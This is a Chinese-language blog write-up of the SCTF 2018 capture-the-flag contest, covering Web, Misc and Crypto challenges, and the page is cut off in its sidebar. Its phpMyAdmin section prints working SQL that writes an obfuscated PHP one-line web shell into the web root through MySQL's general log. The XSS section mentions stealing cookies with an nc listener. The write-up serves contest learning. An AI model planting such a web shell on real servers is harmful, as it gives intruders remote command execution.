@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="KarmA" />
+
+
+
+<meta name="description" content="参加的第一场校赛——SCTF 2018，连续肝了一天半，全程打酱油，做Misc &amp;amp; Crypto，全程现学现卖。 在未成为赛棍之前，每场CTF都是被虐的过程。">
+<meta name="keywords" content="CTF,Summary">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SCTF 2018 WriteUp &amp; Summary">
+<meta property="og:url" content="http://blog.karmaof.me/Study/sctf-2018.html">
+<meta property="og:site_name" content="KarmA @ D0g3">
+<meta property="og:description" content="参加的第一场校赛——SCTF 2018，连续肝了一天半，全程打酱油，做Misc &amp;amp; Crypto，全程现学现卖。 在未成为赛棍之前，每场CTF都是被虐的过程。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcly1fsiul263iij30za0ps0ud.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fsmeg3zfswj30ew04e3yx.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79ly1fsmfautfj4j30g80c8dhc.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fsmfffjituj30ns09eq6r.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fsmd9qjzxuj318s17ejy6.jpg">
+<meta property="og:updated_time" content="2018-10-08T10:55:58.541Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SCTF 2018 WriteUp &amp; Summary">
+<meta name="twitter:description" content="参加的第一场校赛——SCTF 2018，连续肝了一天半，全程打酱油，做Misc &amp;amp; Crypto，全程现学现卖。 在未成为赛棍之前，每场CTF都是被虐的过程。">
+<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tKfTcly1fsiul263iij30za0ps0ud.jpg">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="KarmA @ D0g3" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>SCTF 2018 WriteUp &amp; Summary | KarmA @ D0g3</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: false,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/2.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">KarmA</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Stay hungry.Stay foolish.</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">Home</a></li>
+                        
+                            <li><a href="/archives/">Archives</a></li>
+                        
+                            <li><a href="/tags/">Tags</a></li>
+                        
+                            <li><a href="/board/">Comment</a></li>
+                        
+                            <li><a href="/about/">About &amp; Links</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" href="https://github.com/akkayin" title="GitHub"></a>
+                            
+                                <a class="fa Email" href="mailto:karma@d0g3.cn" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="http://weibo.com/akkayin" title="新浪微博"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/harold-95-37/activities" title="知乎"></a>
+                            
+                                <a class="fa Twitter" href="https://twitter.com/harold_kung" title="Twitter"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Achievements/">Achievements</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Book/">Book</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CET/">CET</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMS-Recurrence/">CMS Recurrence</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Expectation/">Expectation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Film/">Film</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flag/">Flag</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MISC/">MISC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mac/">Mac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mark/">Mark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Meditation/">Meditation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Movie/">Movie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Notes/">Notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Penetration-Testing/">Penetration Testing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Perception/">Perception</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL-Injection/">SQL Injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Scrapy/">Scrapy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shell/">Shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Summary/">Summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vulnhub/">Vulnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Words-Phrases/">Words&Phrases</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mentohust/">mentohust</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心路历程/">心路历程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透课程/">渗透课程</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">KarmA</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/2.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">KarmA</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Stay hungry.Stay foolish.</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">Home</a></li>
+                
+                    <li><a href="/archives/">Archives</a></li>
+                
+                    <li><a href="/tags/">Tags</a></li>
+                
+                    <li><a href="/board/">Comment</a></li>
+                
+                    <li><a href="/about/">About &amp; Links</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/akkayin" title="GitHub"></a>
+                            
+                                <a class="fa Email" target="_blank" href="mailto:karma@d0g3.cn" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="http://weibo.com/akkayin" title="新浪微博"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/harold-95-37/activities" title="知乎"></a>
+                            
+                                <a class="fa Twitter" target="_blank" href="https://twitter.com/harold_kung" title="Twitter"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-sctf2018" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/Study/sctf-2018.html" class="article-date">
+      <time datetime="2018-06-21T07:30:14.000Z" itemprop="datePublished">2018-06-21</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SCTF 2018 WriteUp &amp; Summary
+    </h1>
+  
+
+        
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Study/">Study</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Summary/">Summary</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <excerpt in="" index="" |="" 首页摘要="">
+
+<p>参加的第一场校赛——SCTF 2018，连续肝了一天半，全程打酱油，做Misc &amp; Crypto，全程现学现卖。</p>
+<p><strong>在未成为赛棍之前，每场CTF都是被虐的过程。</strong><a id="more"></a></p>
+<the rest="" of="" contents="" |="" 余下全文="">
+
+<p><a href="https://www.xctf.org.cn/library/details/242b5bc84314a983ee39d5bb5aab5243c875e3fc/" target="_blank" rel="noopener">官方Wp</a> / <a href="http://www.venenof.com/index.php/archives/551/" target="_blank" rel="noopener">Nu1L WP</a></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="新的建议板"><a href="#新的建议板" class="headerlink" title="新的建议板"></a>新的建议板</h2><p>一开始就去测试基本的xss，后来发现script被过滤了。<img src="https://ws3.sinaimg.cn/large/006tKfTcly1fsiul263iij30za0ps0ud.jpg" alt=""></p>
+<p>后来大佬提示看加载，发现有一个angular.***.js的问js加载。</p>
+<p>然后搜了一波发现了几篇科普文和总结绕过姿势的文章</p>
+<blockquote>
+<p><a href="http://www.freebuf.com/vuls/125932.html" target="_blank" rel="noopener">AngularJS沙箱绕过：反射型XSS导致麦当劳用户密码泄露</a></p>
+<p><a href="http://seaii-blog.com/index.php/2017/09/02/68.html" target="_blank" rel="noopener">AngularJS沙盒逃逸姿势总结</a></p>
+<p><a href="https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs" target="_blank" rel="noopener">XSS without HTML: Client-Side Template Injection with AngularJS</a></p>
+</blockquote>
+<p>这题的收获就是，学会如何用xss去获取想要的信息（cookies、页面源码……）、还有用nc监听端口获取信息。</p>
+<p>最后，发现Google的<a href="http://www.xssgame.com/" target="_blank" rel="noopener">xss平台</a>也挺好玩的。有空通关一波！</p>
+<h2 id="Nginx的秘密"><a href="#Nginx的秘密" class="headerlink" title="Nginx的秘密"></a>Nginx的秘密</h2><p>这道题结合了好几个考点。。我一开始只找到了XXE的xml上传漏洞点</p>
+<p>第一个关键点是Web缓存漏洞，没找到这个，就算xxe弄出来了也没用……</p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/node/CVE-2017-14849" target="_blank" rel="noopener">static存在目录穿越漏洞</a>，然后结合题目hint，下载nginx的配置文件，然后与默认配置文件进行对比，查找difference</p>
+<h2 id="easiest-web-phpmyadmin"><a href="#easiest-web-phpmyadmin" class="headerlink" title="easiest web - phpmyadmin"></a>easiest web - phpmyadmin</h2><p>这道题跟之前小组内的那次内网题的入口差不多，一样是通过禁用 INTO OUTFILE 来免杀一句话木马，但是可以通过日志记录写一句话马进去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&apos;on&apos;;</span><br><span class="line">set global general_log_file=&apos;D:/phpStudy/www/karma.php&apos;; # 查看 general log file查看网站根目录位置</span><br><span class="line">select &quot;&lt;?php ($_=@$_GET[a]).@$_($_POST[&apos;cmd&apos;]); ?&gt;&quot;;</span><br><span class="line">set global general_log=off; # 可有可无</span><br></pre></td></tr></table></figure>
+<p>连上之后就可以发现flag在根目录了。至于提(搅)权(屎)，应该也是可行的。</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h2><p>追踪tcp流，当时没有反应过来少了个o…就错过了一血。。</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fsmeg3zfswj30ew04e3yx.jpg" alt=""></p>
+<h2 id="被动了手脚的数据"><a href="#被动了手脚的数据" class="headerlink" title="被动了手脚的数据"></a>被动了手脚的数据</h2><p><a href="https://blog.csdn.net/yangbingzhou/article/details/39504015" target="_blank" rel="noopener">Modbus协议分析——TCP/RTU</a></p>
+<p><a href="http://www.freebuf.com/articles/ics-articles/148637.html" target="_blank" rel="noopener">工业控制系统安全之——Modbus学习笔记</a></p>
+<h2 id="肥宅快乐"><a href="#肥宅快乐" class="headerlink" title="肥宅快乐"></a>肥宅快乐</h2><p>这个游戏。。玩通关就会有flag，但是作为一个geek，肯定要找捷径啊！！就像Nu1L战队一样，以来直接</p>
+<blockquote>
+<p>ActionScriptViewer直接解包看到Instance of Symbol 1217 MovieClip “textBox” in Symbol 2369 MovieClip Frame 440中存在”Normally I would be. This is for you U1lDe0YzaVpoYWlfa3U0aWxlX1QxMTF9, I thought I’d get to safer ground.”</p>
+</blockquote>
+<h2 id="侧信道初探"><a href="#侧信道初探" class="headerlink" title="侧信道初探"></a>侧信道初探</h2><p>这是跟硬件安全有关的知识，<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_side_channel/" target="_blank" rel="noopener">侧信道</a></p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fsmfautfj4j30g80c8dhc.jpg" alt=""></p>
+<p>一开始死看这几行代码是什么意思。。。但是后面hint说是简单的能量分析攻击（SPA），就说明可以直接读能量图得到flag，但是后来读错了。。正确读法如下：</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fsmfffjituj30ns09eq6r.jpg" alt=""></p>
+<h2 id="神秘的交易"><a href="#神秘的交易" class="headerlink" title="神秘的交易"></a>神秘的交易</h2><p><a href="https://www.waitalone.cn/security-hardware-usb.html" target="_blank" rel="noopener">软件</a></p>
+<p><a href="https://bbs.pediy.com/thread-151259.htm" target="_blank" rel="noopener">[原创]用逻辑嗅探破解接触式IC卡口令</a></p>
+<p>这个是4422卡，稍微好读好懂一点。但是要注意从右往左读，逻辑分析仪左往右是低到⾼，我们读的时候是从 ⾼到低。反正就是去读一遍文档看看有什么特性，然后就是读就好了。</p>
+<h2 id="交易识破后的报复"><a href="#交易识破后的报复" class="headerlink" title="交易识破后的报复"></a>交易识破后的报复</h2><p><a href="https://wenku.baidu.com/view/912df7fcf705cc17552709fa.html?rec_flag=default" target="_blank" rel="noopener">SLE4428 IC卡介绍及应用</a></p>
+<p><a href="http://www.docin.com/p-644313923.html" target="_blank" rel="noopener"> FM4428 8K 位接触式逻辑加密卡电路</a></p>
+<p>4428卡每次写/擦除数据都要校验，连续八次校验密码不成功，卡就会被自动锁死。</p>
+<p>当时做的时候，根据上一题那样的做法，去读，去看文档，结果找到校验的片段（1011 0011 xxxx xxxx）。想着有修改，应该只需要对比就可以得出哪里做了修改，然后把可疑的flag都找出来，发现。。不行。。后来看了wp发现自己有个点理解错了（4428控制字只有6位）</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="it-may-contain-‘flag’"><a href="#it-may-contain-‘flag’" class="headerlink" title="it may contain ‘flag’"></a>it may contain ‘flag’</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n=0x1fb18fb44f4449f45ea938306c47b91f64b6c176bd24dbb35aa876f73859c90f0e1677d07430a1188176bc0b901ca7b01f6a99a7df3aec3dd41c3d80f0d17292e43940295b2aa0e8e5823ffcf9f5f448a289f2d3cb27366f907ee62d1aaeba490e892dc69dacbafa941ab7be809e1f882054e26add5892b1fcf4e9f1c443d93bf</span><br><span class="line">e=0xe42a12145eaa816e2846200608080305c99468042450925789504307cbc54a20ed7071b68b067b703a1679d861795542f8cbd2d1cb4d3847d0940cac018cdb0fa729571afbe10c1b8be2dd8acd99ee48b77d53c435b9c2fed59e12e02ad8cfc2bcc46ad85534c266dcc1f3a1a03d87118eaf3f5b3eeeb3be84ad023a4bf34939</span><br><span class="line">c=0xd19d63015bdcb0b61824237b5c67cb2ef09af0c6cd30e193ff9683357b1e45ab4df607b8c1e0b96cafc49a84d7e655c3ce0f71b1d217eec9ca6cdfa57dd3dc92533b79431aa8a7d6ca67ac9cdd65b178a5a96ab7ce7bf88440f4a9b9d10151b0c942a42fdab9ea2c2f0c3706e9777c91dcc9bbdee4b0fb7f5d3001719c1dd3d3</span><br><span class="line">Tell me the msg.</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">CTF中RSA的常见攻击方法</a></p>
+<p>搜集资料，发现他是低解密指数攻击，所以可以用Wiener Attack来攻击，直接下载大佬的脚本，将参数修改，就可以跑出来了。</p>
+<h2 id="a-number-problem"><a href="#a-number-problem" class="headerlink" title="a number problem"></a>a number problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x**33=1926041757553905692219721422025224638913707 mod 3436415358139016629092568198745009225773259</span><br><span class="line">tell me the smallest answer of x</span><br></pre></td></tr></table></figure>
+<p>数论的知识～～连续肝一天半的时候，半夜疯狂看中国剩余定理，结果。。似懂非懂，发现还是不会。</p>
+<p><a href="http://blog.miskcoo.com/2014/09/chinese-remainder-theorem" target="_blank" rel="noopener">扩展欧几里得算法与中国剩余定理</a>留一波大佬的解释，等明年学密码学之前再看看～～</p>
+<p>但是打完之后，发现有一个非预期解：</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fsmd9qjzxuj318s17ejy6.jpg" alt=""></p>
+<p>看来以后去读master的时候，有救了:)<a href="http://www.wolframalpha.com/" target="_blank" rel="noopener">WolframAlpha</a></p>
+<h2 id="ElGamal-Hacker"><a href="#ElGamal-Hacker" class="headerlink" title="ElGamal Hacker"></a>ElGamal Hacker</h2><p>离散对数求私钥</p>
+</the></excerpt>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/Study/sctf-2018.html">SCTF 2018 WriteUp &amp; Summary</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">KarmA</a></p>
+        <p><span class="post-count">Words:</span>1,111</p>
+        <p><span class="post-count">Time:</span>4 mins</p>
+        <p><span>Created:</span>2018-06-21, 15:30:14</p>
+        <p><span>Updated:</span>2018-10-08, 18:55:58</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/Study/sctf-2018.html" title="SCTF 2018 WriteUp &amp; Summary">http://blog.karmaof.me/Study/sctf-2018.html</a>
+            <span class="copy-path" data-clipboard-text="From http://blog.karmaof.me/Study/sctf-2018.html　　By KarmA" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/Study/achievemens-in-CyberSec.html">
+                    Achievements in Cyber Security
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/Study/sql-blind.html">
+                    浅谈SQL盲注
+                </a>
+            </div>
+        
+    </nav>
+
+  
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#新的建议板"><span class="toc-text">新的建议板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx的秘密"><span class="toc-text">Nginx的秘密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easiest-web-phpmyadmin"><span class="toc-text">easiest web - phpmyadmin</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#神奇的Modbus"><span class="toc-text">神奇的Modbus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#被动了手脚的数据"><span class="toc-text">被动了手脚的数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#肥宅快乐"><span class="toc-text">肥宅快乐</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#侧信道初探"><span class="toc-text">侧信道初探</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#神秘的交易"><span class="toc-text">神秘的交易</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#交易识破后的报复"><span class="toc-text">交易识破后的报复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#it-may-contain-‘flag’"><span class="toc-text">it may contain ‘flag’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#a-number-problem"><span class="toc-text">a number problem</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ElGamal-Hacker"><span class="toc-text">ElGamal Hacker</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"SCTF 2018 WriteUp & Summary　| KarmA @ D0g3　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+        
+      <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zNDM3Ny8xMDkxNA==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/Study/achievemens-in-CyberSec.html" title="Pre: Achievements in Cyber Security">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/Study/sql-blind.html" title="Next: 浅谈SQL盲注">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/Study/docker-website.html">Docker建站——从入门到“放弃”</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/codeaudit-environment-mac.html">Code Audit Environment on Mac</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/vulnhub-goldeneye.html">Vulnhub-GoldenEye 通关指南</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/Amateur-OPS-CTFd.html">Act as an Amateur OPS in D0g3-CTFd</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/vulnhub-lampiao.html">Vulnhub-Lampião：1 通关指南</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/vulnhub-lazysysadmin.html">Vulnhub-LazySysAdmin 通关指南</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/ballroom-e-youkoso.html">《Ballroom e Youkoso 舞动青春》观后感</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/feelings-xhssf.html">《西虹市首富》观后感</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/sophomore-flags.html">It's time to set Flags in Sophomore Year (持续更新)</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/achievemens-in-CyberSec.html">Achievements in Cyber Security</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/sctf-2018.html">SCTF 2018 WriteUp & Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/sql-blind.html">浅谈SQL盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/redtiger.html">RedTiger 练习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/spider-faster.html">How to Spider faster and faster</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/scrapy-warmup.html">Scrapy Warm-Up</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/rapid-recurrence.html">Rapid Recurrence Of CVEs</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/privilege-escalation.html">Get Shell ->  Get Root</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/mac-personal-settings.html">Mac Personal Settings</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/rewrite-pwnhub-subject.html">复现Pwnhub会员日的一道题</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/be-grateful.html">Being grateful for what you have</a></li><li class="post-list-item"><a class="post-list-link" 